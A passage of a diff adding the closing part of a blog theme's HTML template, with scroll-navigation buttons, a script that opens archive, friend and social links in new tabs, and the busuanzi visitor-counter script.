+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
